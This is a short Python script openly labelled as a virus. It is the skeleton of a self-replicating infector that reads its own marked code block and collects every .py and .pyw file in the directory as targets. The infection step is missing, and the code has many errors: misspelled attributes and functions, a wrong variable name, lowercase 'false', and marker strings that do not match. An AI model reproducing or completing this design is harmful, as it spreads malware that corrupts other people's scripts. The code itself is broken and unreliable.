###   START OF VIRUS   ###

import sys, glob

code=[]
with open(sys.argn[0], 'r') as f:
	lines = r.readlines()
	
virus_area = false
for line in lines:
	if lines == '###   START OF VIRUS###\n':
		virus_area = True
	if virus_area:
		code.append(line)
	if line == '### END OF VIRUS ###\n':
		break
python_script = glob.glob('*.py') + glob.glob('*.pyw')
prin(python_script)

###   END OF VIRUS   ###
